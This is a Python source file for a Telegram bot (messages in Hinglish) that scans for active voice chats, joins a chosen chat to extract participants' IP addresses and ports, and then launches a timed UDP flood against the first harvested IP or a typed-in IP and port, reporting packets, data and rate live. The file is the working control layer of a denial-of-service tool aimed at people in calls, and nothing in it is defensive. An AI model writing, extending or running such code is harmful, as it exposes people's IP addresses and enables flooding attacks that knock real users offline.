"""Fixed bot handler — stable state, no crashes during attack."""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

from pyrogram import Client, filters
from pyrogram.errors import FloodWait
from pyrogram.handlers import CallbackQueryHandler, MessageHandler
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from attack_engine import AttackEngine
from utils import human_bytes, is_valid_port
from vc_detector import VCDetector, VCRecord

LOGGER = logging.getLogger(__name__)


class BotState(str, Enum):
    IDLE = "IDLE"
    SCANNING = "SCANNING"
    SELECTION = "SELECTION"
    JOINING = "JOINING"
    MANUAL_JOIN_WAIT = "MANUAL_JOIN_WAIT"
    READY = "READY"
    CONFIRM_ATTACK = "CONFIRM_ATTACK"
    ATTACKING = "ATTACKING"


@dataclass
class SessionContext:
    state: BotState = BotState.IDLE
    active_records: list = field(default_factory=list)
    selected_record: Optional[VCRecord] = None
    extracted_metadata: Optional[dict] = None
    target_ip: Optional[str] = None
    target_port: int = 0
    progress_task: Optional[asyncio.Task] = None
    pending_attack: bool = False
    manual_join_requested: bool = False


class BotHandler:
    def __init__(
        self,
        bot: Client,
        detector: VCDetector,
        engine: AttackEngine,
        admin_id: Optional[int],
        max_duration: int,
        scan_limit: int,
    ) -> None:
        self.bot = bot
        self.detector = detector
        self.engine = engine
        self.admin_id = admin_id
        self.max_duration = max_duration
        self.scan_limit = scan_limit
        self.ctx = SessionContext()

    def register_handlers(self):
        self.bot.add_handler(MessageHandler(self.on_scan, filters.command("scan")))
        self.bot.add_handler(MessageHandler(self.on_stop, filters.command("stop")))
        self.bot.add_handler(MessageHandler(self.on_attack_ip, filters.command("attack")))
        self.bot.add_handler(MessageHandler(self.on_status, filters.command("status")))
        self.bot.add_handler(CallbackQueryHandler(self.on_callback))

    async def on_scan(self, client: Client, message):
        if self.ctx.state not in (BotState.IDLE,):
            await message.reply(
                f"⚠️ State: {self.ctx.state.value}\n/stop maar ke reset kar phir /scan"
            )
            return

        self.ctx.state = BotState.SCANNING
        status = await message.reply("🔎 Scanning for active VCs...")

        try:
            records = await self.detector.scan_active_voice_chats(limit=self.scan_limit)
        except FloodWait as e:
            wait = e.value + 2
            await status.edit_text(f"⏳ FloodWait {e.value}s — auto waiting...")
            await asyncio.sleep(wait)
            try:
                records = await self.detector.scan_active_voice_chats(limit=self.scan_limit)
            except Exception as exc:
                await status.edit_text(f"❌ Retry fail: {exc}")
                self.ctx.state = BotState.IDLE
                return
        except Exception as exc:
            LOGGER.exception("Scan failed")
            await status.edit_text(f"❌ Scan fail: {exc}")
            self.ctx.state = BotState.IDLE
            return

        self.ctx.active_records = records

        if not records:
            await status.edit_text(
                "❌ Koi active VC nahi mili.\n\n"
                "Check karo:\n"
                "• Kisi group mein VC chal rahi ho\n"
                "• SESSION_STRING wala account us group mein member ho"
            )
            self.ctx.state = BotState.IDLE
            return

        buttons = []
        for idx, item in enumerate(records):
            title = item.title[:35] if len(item.title) <= 35 else item.title[:32] + "..."
            buttons.append([InlineKeyboardButton(
                f"{idx + 1}. {title}", callback_data=f"select:{idx}"
            )])

        await status.edit_text(
            f"✅ {len(records)} active VC mili:\n\nSelect karo:",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        self.ctx.state = BotState.SELECTION

    async def on_stop(self, client: Client, message):
        self.engine.stop()
        if self.ctx.progress_task and not self.ctx.progress_task.done():
            self.ctx.progress_task.cancel()
            try:
                await self.ctx.progress_task
            except asyncio.CancelledError:
                pass
            self.ctx.progress_task = None

        if self.ctx.selected_record:
            try:
                await self.detector.leave_call(self.ctx.selected_record)
            except Exception:
                pass

        self.ctx = SessionContext()
        await message.reply("🛑 Sab band. State reset → IDLE.")

    async def on_status(self, client: Client, message):
        vc_name = self.ctx.selected_record.title if self.ctx.selected_record else "None"
        await message.reply(
            f"📊 Current Status:\n"
            f"• State: {self.ctx.state.value}\n"
            f"• Selected VC: {vc_name}\n"
            f"• Target IP: {self.ctx.target_ip or 'Not set'}\n"
            f"• Target Port: {self.ctx.target_port or 'Not set'}\n"
            f"• Attack Pending: {'Yes' if self.ctx.pending_attack else 'No'}"
        )

    async def on_attack_ip(self, client: Client, message):
        args = message.text.split()
        if len(args) < 3:
            await message.reply(
                "❌ Usage: /attack <ip> <port> [seconds]\n"
                "Example: /attack 192.168.1.1 8080 60"
            )
            return

        ip = args[1]
        try:
            port = int(args[2])
            duration = int(args[3]) if len(args) > 3 else 30
        except ValueError:
            await message.reply("❌ Port aur duration number hone chahiye.")
            return

        duration = min(duration, self.max_duration)

        if not is_valid_port(port):
            await message.reply("❌ Invalid port. 1-65535 ke beech hona chahiye.")
            return

        await self._start_attack(message.chat.id, ip, port, duration)

    async def on_callback(self, client: Client, callback_query):
        data = callback_query.data or ""

        handlers = {
            "join:yes": self._handle_join_yes,
            "join:no": self._handle_join_no,
            "manual_join:confirm": self._handle_manual_join_confirm,
            "manual_join:cancel": self._handle_manual_join_cancel,
            "attack:confirm": self._handle_attack_confirm,
            "attack:cancel": self._handle_attack_cancel,
            "leave": self._handle_leave,
            "global_stop": self._handle_global_stop,
        }

        if data.startswith("select:"):
            await self._handle_vc_selection(callback_query, data)
            return

        if data in handlers:
            await handlers[data](callback_query)
            return

        if data == "manual_attack":
            await callback_query.answer("Use /attack <ip> <port> [duration]")

    async def _handle_vc_selection(self, callback_query, data):
        try:
            index = int(data.split(":", 1)[1])
            self.ctx.selected_record = self.ctx.active_records[index]

            await callback_query.message.edit_text(
                f"🎯 Selected: {self.ctx.selected_record.title}\n\n"
                f"VC join karke IP extract karein?",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("✅ PROCEED", callback_data="join:yes"),
                    InlineKeyboardButton("❌ CANCEL", callback_data="join:no")
                ]])
            )
            await callback_query.answer()
        except Exception as exc:
            await callback_query.answer(f"Error: {exc}", show_alert=True)

    async def _handle_join_no(self, callback_query):
        self.ctx.state = BotState.IDLE
        await callback_query.message.edit_text("❌ Cancel.")
        await callback_query.answer()

    async def _handle_join_yes(self, callback_query):
        if not self.ctx.selected_record:
            await callback_query.answer("Koi VC select nahi!", show_alert=True)
            return

        self.ctx.state = BotState.JOINING
        await callback_query.message.edit_text("⏳ VC join karke IP extract ho raha hai...")
        await callback_query.answer()

        try:
            metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
            self.ctx.extracted_metadata = metadata

            if not metadata.get("joined"):
                self.ctx.state = BotState.MANUAL_JOIN_WAIT
                self.ctx.manual_join_requested = True
                notice = metadata.get("notice") or "Auto join fail."
                await callback_query.message.edit_text(
                    f"⚠️ {notice}\n\n"
                    f"Apne account se manually VC join kar, phir confirm dabao.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ Join Ho Gaya", callback_data="manual_join:confirm")],
                        [InlineKeyboardButton("❌ Cancel", callback_data="manual_join:cancel")],
                    ])
                )
                return

            await self._process_metadata(callback_query, metadata)

        except Exception as exc:
            LOGGER.exception("Join/Extract fail")
            self.ctx.state = BotState.IDLE
            await callback_query.message.edit_text(f"❌ Fail: {exc}")

    async def _handle_manual_join_cancel(self, callback_query):
        self.ctx.state = BotState.IDLE
        self.ctx.manual_join_requested = False
        await callback_query.message.edit_text("❌ Cancel.")
        await callback_query.answer()

    async def _handle_manual_join_confirm(self, callback_query):
        if not self.ctx.selected_record:
            await callback_query.answer("Koi VC select nahi!", show_alert=True)
            return

        self.ctx.state = BotState.JOINING
        await callback_query.message.edit_text("⏳ Manual join verify karke IP extract ho raha hai...")
        await callback_query.answer()

        try:
            metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
            self.ctx.extracted_metadata = metadata
            self.ctx.manual_join_requested = False
            await self._process_metadata(callback_query, metadata)
        except Exception as exc:
            LOGGER.exception("Manual join confirm fail")
            self.ctx.state = BotState.IDLE
            self.ctx.manual_join_requested = False
            await callback_query.message.edit_text(f"❌ Fail: {exc}")

    async def _process_metadata(self, callback_query, metadata: dict):
        extracted_ips = metadata.get("extracted_ips", [])

        if not extracted_ips:
            self.ctx.state = BotState.READY
            await callback_query.message.edit_text(
                "⚠️ VC access hua but IP nahi mila.\n\n"
                "Use /attack <ip> <port> manually."
            )
            return

        ip_text = "\n".join([
            f"• {x['ip']}:{x['port']} ({x['type']})"
            for x in extracted_ips[:5]
        ])

        join_txt = "✅ VC joined" if metadata.get("joined") else "✅ Manual join confirmed"
        await callback_query.message.edit_text(
            f"{join_txt}\n\n"
            f"🎯 Extracted IPs:\n{ip_text}\n\n"
            f"Action select karo:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 AUTO ATTACK (First IP)", callback_data="attack:confirm")],
                [InlineKeyboardButton("📝 Manual /attack", callback_data="manual_attack")],
                [InlineKeyboardButton("🚪 Leave VC", callback_data="leave")]
            ])
        )

        self.ctx.state = BotState.CONFIRM_ATTACK
        self.ctx.pending_attack = True
        first = extracted_ips[0]
        self.ctx.target_ip = first["ip"]
        self.ctx.target_port = first["port"] if first["port"] > 0 else 10001

    async def _handle_attack_confirm(self, callback_query):
        if not self.ctx.pending_attack or not self.ctx.target_ip:
            await callback_query.answer("Koi attack pending nahi!", show_alert=True)
            return

        await callback_query.answer("🚀 Attack shuru...")
        await self._start_attack(
            callback_query.message.chat.id,
            self.ctx.target_ip,
            self.ctx.target_port,
            60
        )

    async def _handle_attack_cancel(self, callback_query):
        self.ctx.pending_attack = False
        self.ctx.state = BotState.READY
        await callback_query.message.edit_text("❌ Attack cancel.")
        await callback_query.answer()

    async def _start_attack(self, chat_id: int, ip: str, port: int, duration: int):
        self.ctx.state = BotState.ATTACKING

        dashboard = await self.bot.send_message(
            chat_id,
            f"🚀 Attack shuru: {ip}:{port} — {duration}s..."
        )

        # Cancel old progress task if any
        if self.ctx.progress_task and not self.ctx.progress_task.done():
            self.ctx.progress_task.cancel()
            try:
                await self.ctx.progress_task
            except asyncio.CancelledError:
                pass

        self.ctx.progress_task = asyncio.create_task(
            self._progress_loop(dashboard.chat.id, dashboard.id)
        )

        try:
            stats = await self.engine.run_udp_test(ip=ip, port=port, duration=duration)

            await dashboard.edit_text(
                f"✅ Attack complete: {ip}:{port}\n\n"
                f"📊 Stats:\n"
                f"• Packets Sent: {stats.sent_packets:,}\n"
                f"• Failed: {stats.failed_packets:,}\n"
                f"• Data: {human_bytes(stats.bytes_sent)}\n"
                f"• RPS: {stats.rps:.2f}\n"
                f"• Duration: {stats.elapsed:.1f}s"
            )

        except Exception as exc:
            LOGGER.exception("Attack fail")
            try:
                await dashboard.edit_text(f"❌ Attack fail: {exc}")
            except Exception:
                pass

        finally:
            if self.ctx.progress_task and not self.ctx.progress_task.done():
                self.ctx.progress_task.cancel()
                try:
                    await self.ctx.progress_task
                except asyncio.CancelledError:
                    pass
            self.ctx.progress_task = None
            self.ctx.state = BotState.READY
            self.ctx.pending_attack = False

    async def _handle_leave(self, callback_query):
        if self.ctx.selected_record:
            try:
                await self.detector.leave_call(self.ctx.selected_record)
                await callback_query.answer("VC se nikal gaye")
            except Exception as exc:
                await callback_query.answer(f"Leave error: {exc}")

        self.ctx.state = BotState.IDLE
        self.ctx.pending_attack = False
        await callback_query.message.edit_text("👋 VC se nikal gaye. /scan se dobara shuru karo.")

    async def _handle_global_stop(self, callback_query):
        self.engine.stop()
        self.ctx.pending_attack = False
        self.ctx.state = BotState.READY
        await callback_query.answer("🛑 Attack band!")

    async def _progress_loop(self, chat_id: int, message_id: int):
        while True:
            try:
                await asyncio.sleep(5)
                stats = self.engine.stats

                if not stats.running:
                    break

                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=(
                        f"🚀 ATTACK CHAL RAHA HAI\n\n"
                        f"🎯 Target: {self.ctx.target_ip}:{self.ctx.target_port}\n"
                        f"📤 Data: {human_bytes(stats.bytes_sent)}\n"
                        f"📦 Packets: {stats.sent_packets:,} sent / {stats.failed_packets:,} fail\n"
                        f"⚡ RPS: {stats.rps:.2f}\n"
                        f"⏱️ Time: {stats.elapsed:.1f}s"
                    ),
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🛑 STOP", callback_data="global_stop")
                    ]])
                )
            except asyncio.CancelledError:
                break
            except Exception:
                pass
